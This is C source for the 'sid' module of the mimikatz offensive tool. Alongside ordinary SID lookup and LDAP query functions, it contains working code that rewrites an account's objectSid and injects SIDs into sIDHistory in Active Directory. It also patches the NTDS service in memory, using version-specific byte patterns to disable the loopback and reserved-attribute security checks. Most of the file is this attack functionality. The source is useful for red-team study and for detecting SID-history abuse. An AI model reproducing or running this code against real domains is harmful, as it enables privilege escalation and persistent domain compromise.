/*	Benjamin DELPY `gentilkiwi`
https://blog.gentilkiwi.com
benjamin@gentilkiwi.com
Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_sid.h"

const KUHL_M_C kuhl_m_c_sid[] = {
	{kuhl_m_sid_lookup,		L"lookup",			L"Name or SID lookup"},
	{kuhl_m_sid_query,		L"query",			L"Query object by SID or name"},
#if defined(_M_X64)
	{kuhl_m_sid_modify,		L"modify",			L"Modify object SID of an object"},
	{kuhl_m_sid_add,		L"add",				L"Add a SID to sIDHistory of an object"},
	{kuhl_m_sid_clear,		L"clear",			L"Clear sIDHistory of an object"},
	{kuhl_m_sid_patch,		L"patch",			L"Patch NTDS Service"},
#endif
};
const KUHL_M kuhl_m_sid = {
	L"sid",	L"Security Identifiers module",	NULL,
	ARRAYSIZE(kuhl_m_c_sid), kuhl_m_c_sid, NULL, NULL
};

NTSTATUS kuhl_m_sid_lookup(int argc, wchar_t * argv[])
{
	PWSTR name, domain;
	PSID pSid;
	SID_NAME_USE nameUse;
	PCWCHAR szName, szSystem = NULL;
	kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL);

	if(kull_m_string_args_byName(argc, argv, L"sid", &szName, NULL))
	{
		if(ConvertStringSidToSid(szName, &pSid))
		{
			kprintf(L"SID   : %s\n", szName);
			if(IsValidSid(pSid))
			{
				if(kull_m_token_getNameDomainFromSID(pSid, &name, &domain, &nameUse, szSystem))
				{
					kprintf(L"Type  : %s\n"
						L"Domain: %s\n"
						L"Name  : %s\n", kull_m_token_getSidNameUse(nameUse), domain, name);
					LocalFree(name);
					LocalFree(domain);
				}
				else PRINT_ERROR_AUTO(L"kull_m_token_getNameDomainFromSID");
			}
			else PRINT_ERROR(L"Invalid SID\n");
			LocalFree(pSid);
		}
		else PRINT_ERROR_AUTO(L"ConvertStringSidToSid");
	}
	else if(kull_m_string_args_byName(argc, argv, L"name", &szName, NULL))
	{
		kprintf(L"Name  : %s\n", szName);
		if(kull_m_token_getSidDomainFromName(szName, &pSid, &domain, &nameUse, szSystem))
		{
			kprintf(L"Type  : %s\n"
				L"Domain: %s\n"
				L"SID   : ", kull_m_token_getSidNameUse(nameUse), domain);
			kull_m_string_displaySID(pSid);
			kprintf(L"\n");
			LocalFree(pSid);
			LocalFree(domain);
		}
		else PRINT_ERROR_AUTO(L"kull_m_token_getSidDomainFromName");
	}
	else PRINT_ERROR(L"/sid or /name is missing\n");

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sid_query(int argc, wchar_t * argv[])
{
	PLDAP ld;
	PLDAPMessage pMessage = NULL;
	PCWCHAR szSystem = NULL;
	kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL);

	if(kuhl_m_sid_quickSearch(argc, argv, FALSE, szSystem, &ld, &pMessage))
	{
		if(pMessage)
			ldap_msgfree(pMessage);
		ldap_unbind(ld);
	}
	return STATUS_SUCCESS;
}
#if defined(_M_X64)
NTSTATUS kuhl_m_sid_modify(int argc, wchar_t * argv[])
{
	PLDAP ld;
	DWORD dwErr;
	PCWCHAR szName;
	PLDAPMessage pMessage = NULL;
	BERVAL NewSid;
	PBERVAL pNewSid[2] = {&NewSid, NULL};
	LDAPMod Modification = {LDAP_MOD_REPLACE | LDAP_MOD_BVALUES, L"objectSid"};
	PLDAPMod pModification[2] = {&Modification, NULL};
	Modification.mod_vals.modv_bvals = pNewSid;

	if(kull_m_string_args_byName(argc, argv, L"new", &szName, NULL))
	{
		if(ConvertStringSidToSid(szName, (PSID *) &NewSid.bv_val))
		{
			if(IsValidSid((PSID) NewSid.bv_val))
			{
				NewSid.bv_len = GetLengthSid((PSID) NewSid.bv_val);
				if(kuhl_m_sid_quickSearch(argc, argv, TRUE, NULL, &ld, &pMessage))
				{
					kprintf(L"\n  * Will try to modify \'%s\' to \'", Modification.mod_type);
					kull_m_string_displaySID(NewSid.bv_val);
					kprintf(L"\': ");
					dwErr = ldap_modify_s(ld, ldap_get_dn(ld, pMessage), pModification);
					if(dwErr == LDAP_SUCCESS)
						kprintf(L"OK!\n");
					else PRINT_ERROR(L"ldap_modify_s 0x%x (%u)\n", dwErr, dwErr);
					if(pMessage)
						ldap_msgfree(pMessage);
					ldap_unbind(ld);
				}
			}
			else PRINT_ERROR(L"Invalid SID\n");
			LocalFree(NewSid.bv_val);
		}
		else PRINT_ERROR_AUTO(L"ConvertStringSidToSid");
	}
	else PRINT_ERROR(L"/new:sid is needed");
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sid_add(int argc, wchar_t * argv[])
{
	PLDAP ld;
	DWORD dwErr;
	PCWCHAR szName;
	PWCHAR domain = NULL;
	PLDAPMessage pMessage = NULL;
	BERVAL NewSid;
	PBERVAL pNewSid[2] = {&NewSid, NULL};
	LDAPMod Modification = {LDAP_MOD_ADD | LDAP_MOD_BVALUES, L"sIDHistory"};
	PLDAPMod pModification[2] = {&Modification, NULL};
	Modification.mod_vals.modv_bvals = pNewSid;

	if(kull_m_string_args_byName(argc, argv, L"new", &szName, NULL))
	{
		if(ConvertStringSidToSid(szName, (PSID *) &NewSid.bv_val) || kull_m_token_getSidDomainFromName(szName, (PSID *) &NewSid.bv_val, &domain, NULL, NULL))
		{
			if(IsValidSid((PSID) NewSid.bv_val))
			{
				NewSid.bv_len = GetLengthSid((PSID) NewSid.bv_val);
				if(kuhl_m_sid_quickSearch(argc, argv, TRUE, NULL, &ld, &pMessage))
				{
					kprintf(L"\n  * Will try to add \'%s\' this new SID:\'", Modification.mod_type);
					kull_m_string_displaySID(NewSid.bv_val);
					kprintf(L"\': ");
					dwErr = ldap_modify_s(ld, ldap_get_dn(ld, pMessage), pModification);
					if(dwErr == LDAP_SUCCESS)
						kprintf(L"OK!\n");
					else PRINT_ERROR(L"ldap_modify_s 0x%x (%u)\n", dwErr, dwErr);
					if(pMessage)
						ldap_msgfree(pMessage);
					ldap_unbind(ld);
				}
			}
			else PRINT_ERROR(L"Invalid SID\n");
			LocalFree(NewSid.bv_val);
			if(domain)
				LocalFree(domain);
		}
		else PRINT_ERROR_AUTO(L"ConvertStringSidToSid / kull_m_token_getSidDomainFromName");
	}
	else PRINT_ERROR(L"/new:sid or /new:resolvable_name is needed");
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sid_clear(int argc, wchar_t * argv[])
{
	PLDAP ld;
	DWORD dwErr;
	PLDAPMessage pMessage = NULL;

	LDAPMod Modification = {LDAP_MOD_DELETE, L"sIDHistory", NULL};
	PLDAPMod pModification[2] = {&Modification, NULL};

	if(kuhl_m_sid_quickSearch(argc, argv, TRUE, NULL, &ld, &pMessage))
	{
		kprintf(L"\n  * Will try to clear \'%s\': ", Modification.mod_type);
		dwErr = ldap_modify_s(ld, ldap_get_dn(ld, pMessage), pModification);
		if(dwErr == LDAP_SUCCESS)
			kprintf(L"OK!\n");
		else if(dwErr == LDAP_NO_SUCH_ATTRIBUTE)
			PRINT_ERROR(L"No sIDHistory attribute\n");
		else PRINT_ERROR(L"ldap_modify_s 0x%x (%u)\n", dwErr, dwErr);
		if(pMessage)
			ldap_msgfree(pMessage);
		ldap_unbind(ld);
	}
	return STATUS_SUCCESS;
}

BYTE PTRN_JMP[]			= {0xeb};
BYTE PTRN_JMP_NEAR[]	= {0x90, 0xe9};
BYTE PTRN_6NOP[]		= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
#if defined(_M_X64)
// LocalModify:SampModifyLoopbackCheck
BYTE PTRN_WN52_LoopBackCheck[]	= {0x48, 0x8b, 0xd8, 0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0xc7, 0x07, 0x01, 0x00, 0x00, 0x00, 0x83};
BYTE PTRN_WN61_LoopBackCheck[]	= {0x48, 0x8b, 0xf8, 0x48, 0x89, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x41, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x44, 0x89, 0x33, 0x33, 0xdb, 0x39};
BYTE PTRN_WN81_LoopBackCheck[]	= {0x41, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x45, 0x89, 0x34, 0x24, 0x83};
BYTE PTRN_WN10_1607_LoopBackCheck[]	= {0x44, 0x8d, 0x70, 0x01, 0x45, 0x89, 0x34, 0x24, 0x39, 0x05};
KULL_M_PATCH_GENERIC LoopBackCheckReferences[] = {
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WN52_LoopBackCheck),	PTRN_WN52_LoopBackCheck},	{sizeof(PTRN_JMP_NEAR), PTRN_JMP_NEAR}, {24}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LoopBackCheck),	PTRN_WN61_LoopBackCheck},	{sizeof(PTRN_JMP_NEAR), PTRN_JMP_NEAR}, {28}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_LoopBackCheck),	PTRN_WN81_LoopBackCheck},	{sizeof(PTRN_JMP), PTRN_JMP}, {17}},
	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_LoopBackCheck),	PTRN_WN10_1607_LoopBackCheck},	{sizeof(PTRN_JMP), PTRN_JMP}, {14}},
};
// ModSetAttsHelperPreProcess:SysModReservedAtt
BYTE PTRN_WN52_SysModReservedAtt[] = {0x0f, 0xb7, 0x8c, 0x24, 0xc8, 0x00, 0x00, 0x00};
BYTE PTRN_WN61_SysModReservedAtt[] = {0x0f, 0xb7, 0x8c, 0x24, 0x78, 0x01, 0x00, 0x00, 0x4d, 0x8b, 0x6d, 0x00};
BYTE PTRN_WN81_SysModReservedAtt[] = {0x0f, 0xb7, 0x8c, 0x24, 0xb8, 0x00, 0x00, 0x00};
BYTE PTRN_WN10_1607_SysModReservedAtt[]	= {0x8b, 0xbc, 0x24, 0xd8, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x0f, 0xb7, 0x8c, 0x24, 0xc8, 0x00, 0x00, 0x00};
KULL_M_PATCH_GENERIC SysModReservedAttReferences[] = {
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WN52_SysModReservedAtt),	PTRN_WN52_SysModReservedAtt},	{sizeof(PTRN_6NOP), PTRN_6NOP}, {-6}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_SysModReservedAtt),	PTRN_WN61_SysModReservedAtt},	{sizeof(PTRN_6NOP), PTRN_6NOP}, {-6}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_SysModReservedAtt),	PTRN_WN81_SysModReservedAtt},	{sizeof(PTRN_6NOP), PTRN_6NOP}, {-6}},
	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_SysModReservedAtt),	PTRN_WN10_1607_SysModReservedAtt},	{sizeof(PTRN_6NOP), PTRN_6NOP}, {-6}},
};
#elif defined(_M_IX86)
#endif
NTSTATUS kuhl_m_sid_patch(int argc, wchar_t * argv[])
{
	PCWSTR service, lib;
	if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_VISTA)
	{
		service = L"samss";
		lib = L"ntdsa.dll";
	}
	else
	{
		service = L"ntds";
		lib = L"ntdsai.dll";
	}
	kprintf(L"Patch 1/2: ");
	if(kull_m_patch_genericProcessOrServiceFromBuild(LoopBackCheckReferences, sizeof(LoopBackCheckReferences), service, lib, TRUE))
	{
		kprintf(L"Patch 2/2: ");
		kull_m_patch_genericProcessOrServiceFromBuild(SysModReservedAttReferences, sizeof(SysModReservedAttReferences), service, lib, TRUE);
	}
	return STATUS_SUCCESS;
}
#endif
void kuhl_m_sid_displayMessage(PLDAP ld, PLDAPMessage pMessage)
{
	PLDAPMessage pEntry;
	PWCHAR pAttribute, name, domain;
	BerElement* pBer = NULL;
	PBERVAL *pBerVal;
	DWORD i;
	SID_NAME_USE nameUse;

	for(pEntry = ldap_first_entry(ld, pMessage); pEntry; pEntry = ldap_next_entry(ld, pEntry))
	{
		kprintf(L"\n%s\n", ldap_get_dn(ld, pEntry));
		for(pAttribute = ldap_first_attribute(ld, pEntry, &pBer); pAttribute; pAttribute = ldap_next_attribute(ld, pEntry, pBer))
		{
			kprintf(L"  %s: ", pAttribute);
			if(pBerVal = ldap_get_values_len(ld, pEntry, pAttribute))
			{
				if(
					(_wcsicmp(pAttribute, L"name") == 0) ||
					(_wcsicmp(pAttribute, L"sAMAccountName") == 0)
					)
				{
					kprintf(L"%*S\n", pBerVal[0]->bv_len, pBerVal[0]->bv_val);
				}
				else if((_wcsicmp(pAttribute, L"objectSid") == 0))
				{
					kull_m_string_displaySID(pBerVal[0]->bv_val);
					kprintf(L"\n");
				}
				else if((_wcsicmp(pAttribute, L"objectGUID") == 0))
				{
					kull_m_string_displayGUID((LPGUID) pBerVal[0]->bv_val);
					kprintf(L"\n");
				}
				else 
				{
					for(i = 0; pBerVal[i]; i++)
					{
						kprintf(L"\n   [%u] ", i);
						if((_wcsicmp(pAttribute, L"sIDHistory") == 0))
						{
							kull_m_string_displaySID(pBerVal[i]->bv_val);
							if(kull_m_token_getNameDomainFromSID(pBerVal[i]->bv_val, &name, &domain, &nameUse, NULL))
							{
								kprintf(L" ( %s -- %s\\%s )", kull_m_token_getSidNameUse(nameUse), domain, name);
								LocalFree(name);
								LocalFree(domain);
							}
						}
						else kull_m_string_wprintf_hex(pBerVal[i]->bv_val, pBerVal[i]->bv_len, 1);
					}
					kprintf(L"\n");
				}
				ldap_value_free_len(pBerVal);
			}
			ldap_memfree(pAttribute);
		}
		if(pBer)
			ber_free(pBer, 0);
	}
}

BOOL kuhl_m_sid_quickSearch(int argc, wchar_t * argv[], BOOL needUnique, PCWCHAR system, PLDAP *ld, PLDAPMessage *pMessage)
{
	BOOL status = FALSE;
	DWORD dwErr;
	PWCHAR myAttrs[] = {L"name", L"sAMAccountName", L"objectSid", L"sIDHistory", L"objectGUID", NULL}, dn, filter;
	if(filter = kuhl_m_sid_filterFromArgs(argc, argv))
	{
		if(kull_m_ldap_getLdapAndRootDN(system, NULL, ld, &dn, NULL))
		{
			*pMessage = NULL;
			dwErr = ldap_search_s(*ld, dn, LDAP_SCOPE_SUBTREE, filter, myAttrs, FALSE, pMessage);
			if(status = (dwErr == LDAP_SUCCESS))
			{
				switch(ldap_count_entries(*ld, *pMessage))
				{
				case 0:
					status = FALSE;
					PRINT_ERROR(L"No result! - filter was \'%s\'\n", filter);
					break;
				case 1:
					break;
				default:
					if(needUnique)
					{
						PRINT_ERROR(L"Not unique - Please: don\'t brick your AD! - filter was \'%s\'\n", filter);
						status = FALSE;
					}
					break;
				}
			}
			else PRINT_ERROR(L"ldap_search_s 0x%x (%u)\n", dwErr, dwErr);
			
			if(status)
				kuhl_m_sid_displayMessage(*ld, *pMessage);
			else
			{
				if(*pMessage)
					ldap_msgfree(*pMessage);
				ldap_unbind(*ld);
			}
			LocalFree(dn);
		}
		LocalFree(filter);
	}
	return status;
}

PWCHAR kuhl_m_sid_filterFromArgs(int argc, wchar_t * argv[])
{
	PWCHAR filter = NULL;
	PCWCHAR szName;
	DWORD i, sidLen;
	size_t buffLen;
	PSID pSid;

	if(kull_m_string_args_byName(argc, argv, L"sam", &szName, NULL))
	{
		buffLen = wcslen(L"(sAMAccountName=") + wcslen(szName) + wcslen(L")") + 1;
		if(filter = (PWCHAR) LocalAlloc(LPTR, buffLen * sizeof(wchar_t)))
		{
			if(swprintf_s(filter, buffLen, L"(sAMAccountName=%s)", szName) != (buffLen - 1))
				filter = (PWCHAR) LocalFree(filter);
		}
	}
	else if(kull_m_string_args_byName(argc, argv, L"sid", &szName, NULL))
	{
		if(ConvertStringSidToSid(szName, &pSid))
		{
			if(IsValidSid(pSid))
			{
				sidLen = GetLengthSid(pSid);
				buffLen = wcslen(L"(objectSid=") + (sidLen * 3) + wcslen(L")") + 1;
				if(filter = (PWCHAR) LocalAlloc(LPTR, buffLen * sizeof(wchar_t)))
				{
					RtlCopyMemory(filter, L"(objectSid=", sizeof(L"(objectSid="));
					for(i = 0; i < sidLen; i++)
						swprintf_s(filter + ARRAYSIZE(L"(objectSid=") - 1 + (i * 3), 3 + 1, L"\\%02x", ((PBYTE) pSid)[i]);
					filter[buffLen - 2] = L')';
				}
			}
			else PRINT_ERROR(L"Invalid SID\n");
			LocalFree(pSid);
		}
		else PRINT_ERROR_AUTO(L"ConvertStringSidToSid");
	}
	else PRINT_ERROR(L"/sam or /sid to target the account is needed\n");
	
	return filter;
}